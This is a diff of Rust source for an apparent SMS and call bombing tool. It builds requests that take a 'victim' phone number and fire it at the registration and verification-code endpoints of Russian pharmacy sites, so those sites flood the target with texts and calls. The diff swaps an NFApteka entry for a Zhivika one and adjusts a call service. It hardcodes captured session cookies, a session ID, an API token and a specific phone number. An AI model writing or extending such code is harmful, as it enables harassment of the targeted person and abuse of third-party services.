@@ -193,13 +193,90 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 services.push(service);
             }
 
-            //NFApteka
+//            //NFApteka
+//            {
+//                let mut service = Service {
+//                    name: "NFApteka".to_string(),
+//                    service_type: ServiceType::Sms,
+//                    method: Method::POST,
+//                      url: "https://nfapteka.ru/registration/".to_string(),
+//                    headers: HeaderMap::new(),
+//                    body_type: BodyType::Form,
+//                    body: Default::default(),
+//                };
+//
+//                service.headers.insert(
+//                    "User-Agent",
+//                    r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#
+//                        .parse()
+//                        .unwrap(),
+//                );
+//                service
+//                    .headers
+//                    .insert("Accept", r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap());
+//                service.headers.insert(
+//                    "Accept-Language",
+//                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+//                );
+//                service.headers.insert(
+//                    "Accept-Encoding",
+//                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+//                );
+//                service
+//                    .headers
+//                    .insert("Content-Type", r#"application/x-www-form-urlencoded; charset=UTF-8"#.parse().unwrap());
+//                service
+//                  .headers
+//                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+//                    
+//                service.headers.insert(
+//                    "DNT",
+//                    r#"1"#.parse().unwrap(),
+//                );
+//                service.headers.insert(
+//                    "Sec-GPC",
+//                    r#"1"#
+//                        .parse()
+//                        .unwrap(),
+//                );
+//                service.headers.insert("Cookie", r#"rrpvid=386124577368602; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A70%2C%22EXPIRE%22%3A1731704340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_V6NTR3RQJV=GS1.1.1723131934.1.1.1723132031.60.0.0; _ga=GA1.1.1422573028.1723131935; rcuid=66b4e8220312d5b9f82e67ac; _ym_uid=1723131943370705992; _ym_d=1723131943; BITRIX_SMQ_PK=moskva; PHPSESSID=rbvbT2hdzVxPzfcgcGi519r2EuHHpCge; BITRIX_SMQ_SET_CITY=1; BITRIX_SMQ_PK_REGION=moskva"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Origin", r#"https://nfapteka.ru"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Referer", r#"https://nfapteka.ru/registration/"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+//                service
+//                    .headers
+//                    .insert("Priority", r#"u=0"#.parse().unwrap());
+//
+//                let mut phone = victim.phone.clone();
+//                phone.format(WithPlus);
+//                service.body = form!({
+//                    "phoneNumber": phone.phone,
+//                });
+//
+//                services.push(service);
+//            }    
+            //Zhivika
             {
                 let mut service = Service {
-                    name: "NFApteka".to_string(),
+                    name: "Zhivika".to_string(),
                     service_type: ServiceType::Sms,
                     method: Method::POST,
-                      url: "https://nfapteka.ru/registration/".to_string(),
+                      url: "https://a.zhivika.ru/api/auth/codeRequest?city=61".to_string(),
                     headers: HeaderMap::new(),
                     body_type: BodyType::JSON,
                     body: Default::default(),
@@ -213,7 +290,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 );
                 service
                     .headers
-                    .insert("Accept", r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap());
+                    .insert("Accept", r#"*/*"#.parse().unwrap());
                 service.headers.insert(
                     "Accept-Language",
                     r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
@@ -224,10 +301,10 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 );
                 service
                     .headers
-                    .insert("Content-Type", r#"application/x-www-form-urlencoded; charset=UTF-8"#.parse().unwrap());
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                 service
                     .headers
-                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                    .insert("X-Vegetable-Param", r#"c1581181734ff2a451544cfab462773c="#.parse().unwrap());
                     
                 service.headers.insert(
                     "DNT",
@@ -239,16 +316,16 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                         .parse()
                         .unwrap(),
                 );
-                service.headers.insert("Cookie", r#"rrpvid=386124577368602; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A70%2C%22EXPIRE%22%3A1731704340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_V6NTR3RQJV=GS1.1.1723131934.1.1.1723132031.60.0.0; _ga=GA1.1.1422573028.1723131935; rcuid=66b4e8220312d5b9f82e67ac; _ym_uid=1723131943370705992; _ym_d=1723131943; BITRIX_SMQ_PK=moskva; PHPSESSID=rbvbT2hdzVxPzfcgcGi519r2EuHHpCge; BITRIX_SMQ_SET_CITY=1; BITRIX_SMQ_PK_REGION=moskva"#.parse().unwrap());
+                service.headers.insert("Zhivika-API-Token", r#"D5F57GOM2S7HYYS7EXOIIF5OW6NLRFTIWDCP3OM6665ZZDEU5GXQ"#.parse().unwrap());
                 service
                     .headers
-                    .insert("Origin", r#"https://nfapteka.ru"#.parse().unwrap());
+                    .insert("Origin", r#"https://chel.zhivika.ru"#.parse().unwrap());
                 service
                     .headers
                     .insert("Connection", r#"keep-alive"#.parse().unwrap());
                 service
                     .headers
-                    .insert("Referer", r#"https://nfapteka.ru/registration/"#.parse().unwrap());
+                    .insert("Referer", r#"https://chel.zhivika.ru/"#.parse().unwrap());
                 service
                     .headers
                     .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
@@ -257,16 +334,18 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                 service
                     .headers
-                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());
                 service
                     .headers
                     .insert("Priority", r#"u=0"#.parse().unwrap());
                 service.headers.insert("TE", r#"trailers"#.parse().unwrap());
+                service.headers.insert("X-Client-Address-Param", r#""#.parse().unwrap());
 
                 let mut phone = victim.phone.clone();
                 phone.format(WithPlus);
                 service.body = json!({
-                    "phoneNumber": phone.phone,
+                    "Phone": phone.phone,
+                    "DevMode": false
                 });
 
                 services.push(service);
@@ -556,7 +635,7 @@ pub fn construct_call_services_list(victim: Victim) -> Vec<Service> {
                     method: Method::POST,
                     url: "https://nfapteka.ru/registration/".to_string(),
                     headers: HeaderMap::new(),
-                    body_type: BodyType::JSON,
+                    body_type: BodyType::Form,
                     body: Default::default(),
                 };
 
@@ -622,9 +701,10 @@ pub fn construct_call_services_list(victim: Victim) -> Vec<Service> {
                 phone.format(WithPlus);
                 service.body = json!({
                     "phoneNumber": phone.phone,
+                    "component": "component=bxmaker.authuserphone.login&sessid=b2e3c024e9418a1aa60e81f54174699c&method=callCode&phone=%2B7+(977)+785-13-64&registration=Y"
                 });
 
-                services.push(service);
+               services.push(service);
             }
         }
     }
